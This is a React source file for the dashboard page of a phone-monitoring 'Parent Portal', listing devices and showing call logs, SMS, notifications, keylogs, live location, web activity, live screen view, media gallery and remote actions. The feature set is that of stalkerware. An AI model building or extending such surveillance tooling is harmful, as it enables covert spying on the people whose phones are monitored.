import React, { useState, useEffect } from 'react';
import { useAuthContext } from '../context/AuthContext';
import dataService from '../services/dataService';
import Sidebar from '../components/Sidebar';
import Header from '../components/Header';
import StatsCard from '../components/StatsCard';
import CallLogTable from '../components/CallLogTable';
import SmsMessageTable from '../components/SmsMessageTable';
import AppUsageChart from '../components/AppUsageChart';
import LocationMap from '../components/LocationMap';
import WebActivityList from '../components/WebActivityList';
import NotificationList from '../components/NotificationList';
import InstalledAppList from '../components/InstalledAppList';
import KeylogList from '../components/KeylogList';
import LiveScreenView from '../components/LiveScreenView';
import GalleryView from '../components/GalleryView';
import RemoteActions from '../components/RemoteActions';
import { 
  PhoneCall, 
  MessageSquare, 
  LayoutGrid, 
  Globe, 
  Clock, 
  Smartphone,
  ChevronRight,
  Battery,
  Activity,
  AlertTriangle,
  Bell,
  Zap,
  Trash2
} from 'lucide-react';

function DashboardPage() {
  const { token, logout } = useAuthContext();
  const [activeTab, setActiveTab] = useState('devices');
  const [isMobileOpen, setIsMobileOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  const [devices, setDevices] = useState([]);
  const [selectedDeviceId, setSelectedDeviceId] = useState(null);
  const [data, setData] = useState({
    callLogs: [],
    smsMessages: [],
    appUsage: [],
    webActivity: [],
    locations: [],
    installedApps: [],
    notifications: [],
    keylogs: []
  });
  const [refreshTrigger, setRefreshTrigger] = useState(0);

  useEffect(() => {
    if (token) {
      setIsLoading(true);
      const fetchData = async () => {
        try {
          const fetchSafe = async (promise, fallback = []) => {
            try {
              const res = await promise;
              return res.data;
            } catch (err) {
              console.error("Endpoint fetch error:", err);
              return fallback;
            }
          };

          const [devices, calls, sms, apps, web, locs, installed, notifs, keylogs] = await Promise.all([
            fetchSafe(dataService.getDevices(token)),
            fetchSafe(dataService.getCallLogs(token)),
            fetchSafe(dataService.getSmsMessages(token)),
            fetchSafe(dataService.getAppUsage(token)),
            fetchSafe(dataService.getWebActivity(token)),
            fetchSafe(dataService.getLocations(token)),
            fetchSafe(dataService.getInstalledApps(token)),
            fetchSafe(dataService.getNotifications(token)),
            fetchSafe(dataService.getKeylogs(token))
          ]);
          
          setDevices(devices);
          if (devices.length > 0 && !selectedDeviceId) {
            setSelectedDeviceId(devices[0].id);
          }

          setData({
            callLogs: calls,
            smsMessages: sms,
            appUsage: apps,
            webActivity: web,
            locations: locs,
            installedApps: installed,
            notifications: notifs,
            keylogs: keylogs
          });
        } catch (error) {
          console.error('Error in fetchData:', error);
        } finally {
          setIsLoading(false);
        }
      };

      fetchData();
    }
  }, [token, refreshTrigger]);

  const getStatus = (lastSeen) => {
    if (!lastSeen) return 'offline';
    const lastSeenDate = new Date(lastSeen);
    const now = new Date();
    const diffMinutes = (now - lastSeenDate) / (1000 * 60);
    return diffMinutes < 5 ? 'online' : 'offline';
  };

  const formatLastSeen = (lastSeen) => {
    if (!lastSeen) return 'Never';
    const lastSeenDate = new Date(lastSeen);
    const now = new Date();
    const diffMinutes = Math.floor((now - lastSeenDate) / (1000 * 60));
    
    if (diffMinutes < 1) return 'Just now';
    if (diffMinutes < 60) return `${diffMinutes}m ago`;
    const diffHours = Math.floor(diffMinutes / 60);
    if (diffHours < 24) return `${diffHours}h ago`;
    return lastSeenDate.toLocaleDateString();
  };

  const selectedDevice = devices.find(d => d.id === selectedDeviceId);

  const filteredData = {
    callLogs: data.callLogs.filter(item => !selectedDeviceId || item.device_id === selectedDeviceId),
    smsMessages: data.smsMessages.filter(item => !selectedDeviceId || item.device_id === selectedDeviceId),
    appUsage: data.appUsage.filter(item => !selectedDeviceId || item.device_id === selectedDeviceId),
    webActivity: data.webActivity.filter(item => !selectedDeviceId || item.device_id === selectedDeviceId),
    locations: data.locations.filter(item => !selectedDeviceId || item.device_id === selectedDeviceId),
    installedApps: data.installedApps.filter(item => !selectedDeviceId || item.device_id === selectedDeviceId),
    notifications: data.notifications.filter(item => !selectedDeviceId || item.device_id === selectedDeviceId),
    keylogs: (data.keylogs || []).filter(item => !selectedDeviceId || item.device_id === selectedDeviceId),
  };

  const renderContent = () => {
    switch (activeTab) {
      case 'devices':
        return (
          <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
              <StatsCard label="Total Calls" value={filteredData.callLogs.length} icon={PhoneCall} color="bg-blue-50 text-blue-600" trend={12} />
              <StatsCard label="Messages" value={filteredData.smsMessages.length} icon={MessageSquare} color="bg-purple-50 text-purple-600" trend={-5} />
              <StatsCard label="Apps Tracked" value={filteredData.appUsage.length} icon={LayoutGrid} color="bg-pink-50 text-pink-600" />
              <StatsCard label="Sites Visited" value={filteredData.webActivity.length} icon={Globe} color="bg-amber-50 text-amber-600" trend={24} />
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 mt-10">
              <div className="lg:col-span-2">
                <h3 className="text-xl font-bold text-slate-900 mb-6 flex items-center">
                  <Smartphone className="w-5 h-5 mr-2 text-indigo-500" />
                  My Devices
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  {devices.length === 0 ? (
                    <div className="col-span-2 bg-white rounded-3xl p-12 text-center border border-slate-200 border-dashed">
                      <Smartphone className="w-16 h-16 text-slate-200 mx-auto mb-6" />
                      <h3 className="text-xl font-bold text-slate-900 mb-2">No Devices Connected</h3>
                      <p className="text-slate-500 max-w-sm mx-auto">Install the child app on a device to start monitoring.</p>
                    </div>
                  ) : (
                    devices.map(device => {
                      const status = getStatus(device.last_seen);
                      const isSelected = selectedDeviceId === device.id;
                      return (
                        <div 
                          key={device.id}
                          onClick={() => setSelectedDeviceId(device.id)}
                          className={`bg-white rounded-3xl shadow-sm border p-8 hover:shadow-xl hover:shadow-indigo-500/5 hover:-translate-y-1 transition-all cursor-pointer relative overflow-hidden group border-b-4 ${
                            isSelected ? 'border-indigo-500 shadow-md' : 'border-slate-200 border-b-transparent hover:border-b-indigo-500'
                          }`}
                        >
                          <div className="flex justify-between items-start mb-6">
                            <div className="flex items-center">
                              <div className={`p-4 rounded-2xl ${status === 'online' ? 'bg-emerald-100 text-emerald-600' : 'bg-slate-100 text-slate-600'}`}>
                                <Smartphone className="w-8 h-8" />
                              </div>
                              <div className="ml-5">
                                <h3 className="text-xl font-bold text-slate-900">{device.name || 'Unknown Device'}</h3>
                                <p className="text-sm text-slate-500 font-medium">{device.model || 'Unknown Model'}</p>
                              </div>
                            </div>
                            <span className={`px-4 py-1.5 text-xs font-bold rounded-full tracking-wider ${
                              status === 'online' ? 'bg-emerald-100 text-emerald-700' : 'bg-slate-100 text-slate-600'
                            }`}>
                              {status.toUpperCase()}
                            </span>
                          </div>
                          
                          <div className="grid grid-cols-2 gap-6 mb-8">
                            <div className="bg-slate-50 p-4 rounded-2xl flex items-center">
                              <Battery className={`w-5 h-5 mr-3 ${device.battery_level < 20 ? 'text-red-500 animate-pulse' : 'text-slate-400'}`} />
                              <span className="text-sm font-bold text-slate-700">{device.battery_level}%</span>
                            </div>
                            <div className="bg-slate-50 p-4 rounded-2xl flex items-center">
                              <Activity className="w-5 h-5 mr-3 text-slate-400" />
                              <span className="text-sm font-bold text-slate-700">{formatLastSeen(device.last_seen)}</span>
                            </div>
                          </div>

                          <div className="flex items-center justify-between font-bold text-sm">
                            <span className="text-indigo-600 flex items-center">
                              {isSelected ? 'Currently Selected' : 'Select Device'}
                              <ChevronRight className="w-5 h-5 ml-1 transform group-hover:translate-x-1 transition-transform" />
                            </span>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                if (window.confirm(`Permanently delete device "${device.name}"? This cannot be undone.`)) {
                                  dataService.deleteDevice(token, device.id).then(() => {
                                    setDevices(devices.filter(d => d.id !== device.id));
                                    if (selectedDeviceId === device.id) setSelectedDeviceId(null);
                                  });
                                }
                              }}
                              className="p-2.5 bg-red-50 text-red-600 rounded-2xl hover:bg-red-500 hover:text-white transition-all shadow-sm"
                              title="Delete Device"
                            >
                              <Trash2 className="w-4 h-4" />
                            </button>
                          </div>
                        </div>
                      );
                    })
                  )}
                </div>
              </div>
            </div>
          </div>
        );

      case 'calls':
        return <CallLogTable callLogs={filteredData.callLogs} />;

      case 'sms':
        return <SmsMessageTable smsMessages={filteredData.smsMessages} />;

      case 'notifications':
        return <NotificationList notifications={filteredData.notifications} apps={filteredData.installedApps} />;

      case 'location':
        return <LocationMap locations={filteredData.locations} />;

      case 'apps':
        return (
          <div className="space-y-12">
            <div className="bg-white rounded-3xl shadow-sm border border-slate-200 p-8">
                <div className="flex justify-between items-start mb-8">
                  <div>
                    <h3 className="text-xl font-bold text-slate-900 tracking-tight">App Usage Analytics</h3>
                    <p className="text-sm text-slate-500 mt-1 font-medium">Daily breakdown of most used applications</p>
                  </div>
                </div>
                <AppUsageChart data={filteredData.appUsage} />
             </div>
             
             <InstalledAppList apps={filteredData.installedApps} />
          </div>
        );

      case 'web':
        return <WebActivityList activity={filteredData.webActivity} />;

      case 'keylogs':
        return <KeylogList keylogs={filteredData.keylogs} />;

      case 'live-view':
        return <LiveScreenView selectedDevice={selectedDevice} />;

      case 'gallery':
        return <GalleryView deviceId={selectedDeviceId} />;

      case 'remote-actions':
        return <RemoteActions deviceId={selectedDeviceId} token={token} fullView={true} />;

      default:
        return null;
    }
  };

  const navItem = [
    { id: 'devices', label: 'Connected Devices' },
    { id: 'live-view', label: 'Live View' },
    { id: 'gallery', label: 'Media Gallery' },
    { id: 'remote-actions', label: 'Remote Actions' },
    { id: 'calls', label: 'Call History' },
    { id: 'sms', label: 'Messages' },
    { id: 'notifications', label: 'Notifications' },
    { id: 'keylogs', label: 'Keylogger' },
    { id: 'location', label: 'Live Location' },
    { id: 'apps', label: 'App Inventory' },
    { id: 'web', label: 'Web Activity' },
  ].find(i => i.id === activeTab);

  return (
    <div className="flex h-screen bg-[#F8FAFC] font-sans overflow-hidden">
      <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} logout={logout} isMobileOpen={isMobileOpen} setIsMobileOpen={setIsMobileOpen} />

      <main className="flex-1 md:ml-64 flex flex-col h-full overflow-hidden relative w-full">
        <Header 
          title={navItem?.label || 'Parent Portal'} 
          devices={devices} 
          selectedDeviceId={selectedDeviceId} 
          setSelectedDeviceId={setSelectedDeviceId} 
          onMenuClick={() => setIsMobileOpen(true)}
        />

        <div className="flex-1 overflow-y-auto p-10">
          {isLoading ? (
            <div className="flex flex-col items-center justify-center h-full">
              <div className="w-12 h-12 border-4 border-indigo-200 border-t-indigo-600 rounded-full animate-spin mb-4"></div>
              <p className="text-slate-500 font-bold animate-pulse tracking-widest text-xs uppercase">Syncing with devices...</p>
            </div>
          ) : (
            <div className="max-w-7xl mx-auto">
              {renderContent()}
            </div>
          )}
        </div>

        {/* Floating Health Status */}
        <div className="absolute bottom-8 right-8 z-20">
          <div className="bg-white/80 backdrop-blur-md px-6 py-4 rounded-2xl shadow-2xl border border-slate-200 flex items-center space-x-4">
            <div className="flex items-center">
              <span className="relative flex h-3 w-3 mr-3">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-3 w-3 bg-emerald-500"></span>
              </span>
              <span className="text-xs font-bold text-slate-700 uppercase tracking-widest">System Healthy</span>
            </div>
            <div className="h-4 w-px bg-slate-200"></div>
            <button 
              onClick={() => setRefreshTrigger(prev => prev + 1)}
              className="text-[10px] font-black text-indigo-600 uppercase hover:text-indigo-700 transition-colors"
            >
              Refresh All
            </button>
          </div>
        </div>
      </main>
    </div>
  );
}

export default DashboardPage;
